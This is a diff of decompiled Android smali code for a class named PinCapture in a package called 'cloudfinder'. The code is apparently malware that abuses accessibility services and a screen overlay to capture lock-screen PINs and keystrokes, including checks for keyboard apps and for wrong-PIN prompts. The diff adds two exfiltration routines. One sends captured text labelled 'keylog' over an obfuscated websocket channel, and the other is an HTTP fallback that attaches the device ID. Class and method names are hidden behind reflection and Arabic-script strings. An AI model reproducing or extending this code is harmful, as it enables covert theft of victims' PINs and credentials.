@@ -190,18 +190,27 @@
     return-object v0
 .end method
 
-.method static synthetic access$1100()Ljava/lang/String;
-    .locals 1
+.method static synthetic access$1100(Ljava/lang/String;Ljava/lang/String;)Z
+    .locals 0
 
     .line 30
-    invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->deviceId()Ljava/lang/String;
+    invoke-static {p0, p1}, Lcom/lite/cloudfinder/pin/PinCapture;->sendWs(Ljava/lang/String;Ljava/lang/String;)Z
 
-    move-result-object v0
+    move-result p0
 
-    return-object v0
+    return p0
 .end method
 
-.method static synthetic access$1200()I
+.method static synthetic access$1200(Ljava/lang/String;)V
+    .locals 0
+
+    .line 30
+    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->sendHttp(Ljava/lang/String;)V
+
+    return-void
+.end method
+
+.method static synthetic access$1300()I
     .locals 1
 
     .line 30
@@ -210,7 +219,7 @@
     return v0
 .end method
 
-.method static synthetic access$1300(Landroid/accessibilityservice/AccessibilityService;)V
+.method static synthetic access$1400(Landroid/accessibilityservice/AccessibilityService;)V
     .locals 0
 
     .line 30
@@ -307,7 +316,7 @@
 .method private static addOverlay(Landroid/accessibilityservice/AccessibilityService;)V
     .locals 5
 
-    .line 800
+    .line 840
     const-string v0, "PinCapture"
 
     sget-object v1, Lcom/lite/cloudfinder/pin/PinCapture;->overlayView:Landroid/view/View;
@@ -316,7 +325,7 @@
 
     return-void
 
-    .line 802
+    .line 842
     :cond_0
     :try_start_0
     const-string v1, "window"
@@ -331,7 +340,7 @@
 
     return-void
 
-    .line 804
+    .line 844
     :cond_1
     new-instance v2, Landroid/view/View;
 
@@ -339,59 +348,59 @@
 
     const v3, 0x1a00a3ff
 
-    .line 805
+    .line 845
     invoke-virtual {v2, v3}, Landroid/view/View;->setBackgroundColor(I)V
 
-    .line 806
+    .line 846
     new-instance v3, Landroid/view/WindowManager$LayoutParams;
 
     invoke-direct {v3}, Landroid/view/WindowManager$LayoutParams;-><init>()V
 
     const/16 v4, 0x7f0
 
-    .line 807
+    .line 847
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->type:I
 
     const/4 v4, -0x3
 
-    .line 808
+    .line 848
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->format:I
 
     const/16 v4, 0x318
 
-    .line 809
+    .line 849
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->flags:I
 
     const/16 v4, 0x33
 
-    .line 813
+    .line 853
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->gravity:I
 
     const/4 v4, -0x1
 
-    .line 814
+    .line 854
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->width:I
 
     const/16 v4, 0x78
 
-    .line 815
+    .line 855
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->height:I
 
     const/4 v4, 0x0
 
-    .line 816
+    .line 856
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->x:I
 
-    .line 817
+    .line 857
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->y:I
 
-    .line 818
+    .line 858
     invoke-interface {v1, v2, v3}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
 
-    .line 819
+    .line 859
     sput-object v2, Lcom/lite/cloudfinder/pin/PinCapture;->overlayView:Landroid/view/View;
 
-    .line 820
+    .line 860
     const-string v1, "overlay added type=2032 h=120"
 
     invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
@@ -403,7 +412,7 @@
     :catchall_0
     move-exception v1
 
-    .line 822
+    .line 862
     new-instance v2, Ljava/lang/StringBuilder;
 
     const-string v3, "overlay failed: "
@@ -418,7 +427,7 @@
 
     invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
 
-    .line 823
+    .line 863
     sget v0, Lcom/lite/cloudfinder/pin/PinCapture;->overlayTries:I
 
     add-int/lit8 v1, v0, 0x1
@@ -429,7 +438,7 @@
 
     if-ge v0, v1, :cond_2
 
-    .line 825
+    .line 865
     new-instance v0, Landroid/os/Handler;
 
     invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
@@ -631,7 +640,7 @@
 .method private static deviceId()Ljava/lang/String;
     .locals 4
 
-    .line 724
+    .line 764
     const-string v0, ""
 
     :try_start_0
@@ -641,7 +650,7 @@
 
     move-result-object v1
 
-    .line 725
+    .line 765
     const-string v2, "\u0620"
 
     const/4 v3, 0x0
@@ -654,14 +663,14 @@
 
     move-result-object v2
 
-    .line 726
+    .line 766
     const-string v3, "\u0625"
 
     invoke-virtual {v1, v3}, Ljava/lang/Class;->getField(Ljava/lang/String;)Ljava/lang/reflect/Field;
 
     move-result-object v1
 
-    .line 727
+    .line 767
     invoke-virtual {v1, v2}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
 
     move-result-object v1
@@ -670,7 +679,7 @@
 
     goto :goto_0
 
-    .line 728
+    .line 768
     :cond_0
     invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;
 
@@ -1672,12 +1681,12 @@
 .method private static isDelete(Ljava/lang/String;)Z
     .locals 2
 
-    .line 767
+    .line 807
     invoke-virtual {p0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
 
     move-result-object v0
 
-    .line 768
+    .line 808
     const-string v1, "\u5220\u9664"
 
     invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
@@ -1702,7 +1711,7 @@
 
     if-nez v0, :cond_1
 
-    .line 769
+    .line 809
     const-string v0, "\u232b"
 
     invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
@@ -1773,7 +1782,7 @@
 
     move v1, v0
 
-    .line 781
+    .line 821
     :goto_0
     invoke-virtual {p0}, Ljava/lang/String;->length()I
 
@@ -1781,7 +1790,7 @@
 
     if-ge v1, v2, :cond_2
 
-    .line 782
+    .line 822
     invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C
 
     move-result v2
@@ -1805,7 +1814,7 @@
     :goto_1
     return v0
 
-    .line 785
+    .line 825
     :cond_2
     invoke-virtual {p0}, Ljava/lang/String;->length()I
 
@@ -1822,12 +1831,12 @@
 .method private static isEnter(Ljava/lang/String;)Z
     .locals 2
 
-    .line 773
+    .line 813
     invoke-virtual {p0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
 
     move-result-object v0
 
-    .line 774
+    .line 814
     const-string v1, "\u786e\u5b9a"
 
     invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
@@ -1854,7 +1863,7 @@
 
     const-string v1, "enter"
 
-    .line 775
+    .line 815
     invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
 
     move-result v1
@@ -1879,7 +1888,7 @@
 
     const-string v1, "ok"
 
-    .line 776
+    .line 816
     invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
 
     move-result v1
@@ -1896,7 +1905,7 @@
 
     const-string v0, "\u2192"
 
-    .line 777
+    .line 817
     invoke-virtual {p0, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
 
     move-result p0
@@ -1921,7 +1930,7 @@
 .method private static isIme(Ljava/lang/String;)Z
     .locals 1
 
-    .line 750
+    .line 790
     const-string v0, "honeyboard"
 
     invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
@@ -1940,7 +1949,7 @@
 
     const-string v0, "gboard"
 
-    .line 751
+    .line 791
     invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
 
     move-result v0
@@ -1957,7 +1966,7 @@
 
     const-string v0, "sogou"
 
-    .line 752
+    .line 792
     invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
 
     move-result v0
@@ -1974,7 +1983,7 @@
 
     const-string v0, "swiftkey"
 
-    .line 753
+    .line 793
     invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
 
     move-result v0
@@ -2009,11 +2018,11 @@
 
     const/4 v0, 0x0
 
-    .line 758
+    .line 798
     :try_start_0
     const-string v1, "keyguard"
 
-    .line 759
+    .line 799
     invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
 
     move-result-object p0
@@ -2022,7 +2031,7 @@
 
     if-eqz p0, :cond_0
 
-    .line 760
+    .line 800
     invoke-virtual {p0}, Landroid/app/KeyguardManager;->isKeyguardLocked()Z
 
     move-result p0
@@ -2045,7 +2054,7 @@
 
     move v1, v0
 
-    .line 789
+    .line 829
     :goto_0
     invoke-virtual {p0}, Ljava/lang/String;->length()I
 
@@ -2053,7 +2062,7 @@
 
     if-ge v1, v2, :cond_1
 
-    .line 790
+    .line 830
     invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C
 
     move-result v2
@@ -2085,7 +2094,7 @@
 
     goto :goto_0
 
-    .line 795
+    .line 835
     :cond_1
     invoke-virtual {p0}, Ljava/lang/String;->length()I
 
@@ -2102,12 +2111,12 @@
 .method private static isWrongHint(Ljava/lang/String;)Z
     .locals 2
 
-    .line 742
+    .line 782
     invoke-virtual {p0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
 
     move-result-object v0
 
-    .line 743
+    .line 783
     const-string v1, "\u5bc6\u7801\u9519\u8bef"
 
     invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
@@ -2126,7 +2135,7 @@
 
     const-string v1, "\u518d\u8bd5"
 
-    .line 744
+    .line 784
     invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
 
     move-result v1
@@ -2143,7 +2152,7 @@
 
     const-string p0, "wrong"
 
-    .line 745
+    .line 785
     invoke-virtual {v0, p0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
 
     move-result p0
@@ -2160,7 +2169,7 @@
 
     const-string p0, "try again"
 
-    .line 746
+    .line 786
     invoke-virtual {v0, p0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
 
     move-result p0
@@ -2193,7 +2202,7 @@
 .method private static match(Ljava/lang/String;)Z
     .locals 6
 
-    .line 735
+    .line 775
     sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->PKGS:[Ljava/lang/String;
 
     array-length v1, v0
@@ -2209,7 +2218,7 @@
 
     aget-object v5, v0, v3
 
-    .line 736
+    .line 776
     invoke-virtual {v5, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
 
     move-result v5
@@ -2223,7 +2232,7 @@
 
     goto :goto_0
 
-    .line 738
+    .line 778
     :cond_1
     const-string v0, "systemui"
 
@@ -3645,21 +3654,24 @@
 .end method
 
 .method private static report(Ljava/lang/String;)V
-    .locals 2
+    .locals 3
 
     .line 700
-    new-instance v0, Ljava/lang/Thread;
+    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;
 
-    new-instance v1, Lcom/lite/cloudfinder/pin/PinCapture$7;
+    .line 701
+    new-instance v1, Ljava/lang/Thread;
 
-    invoke-direct {v1, p0}, Lcom/lite/cloudfinder/pin/PinCapture$7;-><init>(Ljava/lang/String;)V
+    new-instance v2, Lcom/lite/cloudfinder/pin/PinCapture$7;
+
+    invoke-direct {v2, p0, v0}, Lcom/lite/cloudfinder/pin/PinCapture$7;-><init>(Ljava/lang/String;Ljava/lang/String;)V
 
     const-string p0, "pin-report"
 
-    invoke-direct {v0, v1, p0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V
+    invoke-direct {v1, v2, p0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V
 
-    .line 718
-    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
+    .line 707
+    invoke-virtual {v1}, Ljava/lang/Thread;->start()V
 
     return-void
 .end method
@@ -3757,6 +3769,300 @@
     invoke-virtual {v0, v1, p1, p2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
 
     return-void
+.end method
+
+.method private static sendHttp(Ljava/lang/String;)V
+    .locals 6
+
+    .line 746
+    const-string v0, "PinCapture"
+
+    .line 0
+    const-string v1, "http fallback sent dev="
+
+    .line 746
+    :try_start_0
+    new-instance v2, Lorg/json/JSONObject;
+
+    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V
+
+    .line 747
+    const-string v3, "type"
+
+    const-string v4, "pin_capture"
+
+    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+
+    .line 748
+    const-string v3, "msg"
+
+    invoke-virtual {v2, v3, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+
+    .line 749
+    const-string p0, "ts"
+
+    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
+
+    move-result-wide v3
+
+    invoke-virtual {v2, p0, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;
+
+    .line 750
+    invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->deviceId()Ljava/lang/String;
+
+    move-result-object p0
+
+    .line 751
+    invoke-virtual {p0}, Ljava/lang/String;->length()I
+
+    move-result v3
+
+    if-lez v3, :cond_0
+
+    const-string v3, "deviceId"
+
+    invoke-virtual {v2, v3, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+
+    .line 752
+    :cond_0
+    const-string v3, "\u069d\u0696\u0601\u068b.\u0631"
+
+    invoke-static {v3}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
+
+    move-result-object v3
+
+    .line 753
+    const-string v4, "\u0621"
+
+    const-class v5, Lorg/json/JSONObject;
+
+    filled-new-array {v5}, [Ljava/lang/Class;
+
+    move-result-object v5
+
+    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
+
+    move-result-object v3
+
+    .line 754
+    filled-new-array {v2}, [Ljava/lang/Object;
+
+    move-result-object v2
+
+    const/4 v4, 0x0
+
+    invoke-virtual {v3, v4, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
+
+    .line 755
+    new-instance v2, Ljava/lang/StringBuilder;
+
+    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v2, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object p0
+
+    invoke-static {v0, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    :try_end_0
+    .catchall {:try_start_0 .. :try_end_0} :catchall_0
+
+    goto :goto_0
+
+    :catchall_0
+    move-exception p0
+
+    .line 757
+    const-string v1, "http fallback failed"
+
+    invoke-static {v0, v1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
+
+    :goto_0
+    return-void
+.end method
+
+.method private static sendWs(Ljava/lang/String;Ljava/lang/String;)Z
+    .locals 8
+
+    .line 713
+    const-string v0, "\u0622"
+
+    const-string v1, "PinCapture"
+
+    .line 0
+    const-string v2, "ws cacheData sent="
+
+    const/4 v3, 0x0
+
+    .line 713
+    :try_start_0
+    new-instance v4, Lorg/json/JSONArray;
+
+    invoke-direct {v4}, Lorg/json/JSONArray;-><init>()V
+
+    .line 714
+    new-instance v5, Lorg/json/JSONObject;
+
+    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V
+
+    .line 715
+    const-string v6, "pkg"
+
+    const-string v7, "com.android.systemui"
+
+    invoke-virtual {v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+
+    .line 716
+    const-string v6, "type"
+
+    invoke-virtual {v5, v6, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+
+    .line 717
+    const-string p1, "text"
+
+    invoke-virtual {v5, p1, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+
+    .line 718
+    invoke-virtual {v4, v5}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
+
+    .line 720
+    new-instance p0, Lorg/json/JSONObject;
+
+    invoke-direct {p0}, Lorg/json/JSONObject;-><init>()V
+
+    .line 721
+    const-string p1, "k"
+
+    const-string v5, "keylog"
+
+    invoke-virtual {p0, p1, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+
+    .line 722
+    const-string p1, "cache"
+
+    invoke-virtual {v4}, Lorg/json/JSONArray;->toString()Ljava/lang/String;
+
+    move-result-object v4
+
+    invoke-virtual {p0, p1, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+
+    .line 724
+    const-string p1, "\u069c\u065f\u0671\u0680.\u062f"
+
+    invoke-static {p1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
+
+    move-result-object p1
+
+    .line 725
+    const-string v4, "\u0620"
+
+    const/4 v5, 0x0
+
+    invoke-virtual {p1, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
+
+    move-result-object v4
+
+    invoke-virtual {v4, v5, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
+
+    move-result-object v4
+
+    .line 726
+    invoke-virtual {p1, v0}, Ljava/lang/Class;->getField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+
+    move-result-object p1
+
+    .line 727
+    invoke-virtual {p1, v4}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
+
+    move-result-object p1
+
+    if-nez p1, :cond_0
+
+    .line 729
+    const-string p0, "ws channel null, fallback http"
+
+    invoke-static {v1, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    return v3
+
+    .line 732
+    :cond_0
+    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
+
+    move-result-object v4
+
+    const-class v5, Ljava/lang/String;
+
+    const-class v6, Lorg/json/JSONObject;
+
+    filled-new-array {v5, v6}, [Ljava/lang/Class;
+
+    move-result-object v5
+
+    .line 733
+    invoke-virtual {v4, v0, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
+
+    move-result-object v0
+
+    .line 734
+    const-string v4, "cacheData"
+
+    filled-new-array {v4, p0}, [Ljava/lang/Object;
+
+    move-result-object p0
+
+    invoke-virtual {v0, p1, p0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
+
+    move-result-object p0
+
+    .line 735
+    instance-of p1, p0, Ljava/lang/Boolean;
+
+    if-eqz p1, :cond_1
+
+    check-cast p0, Ljava/lang/Boolean;
+
+    invoke-virtual {p0}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result p0
+
+    if-eqz p0, :cond_1
+
+    const/4 p0, 0x1
+
+    goto :goto_0
+
+    :cond_1
+    move p0, v3
+
+    .line 736
+    :goto_0
+    new-instance p1, Ljava/lang/StringBuilder;
+
+    invoke-direct {p1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {p1, p0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;
+
+    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object p1
+
+    invoke-static {v1, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    :try_end_0
+    .catchall {:try_start_0 .. :try_end_0} :catchall_0
+
+    return p0
+
+    :catchall_0
+    move-exception p0
+
+    .line 739
+    const-string p1, "ws send failed"
+
+    invoke-static {v1, p1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
+
+    return v3
 .end method
 
 .method private static setValue(Ljava/lang/String;)V
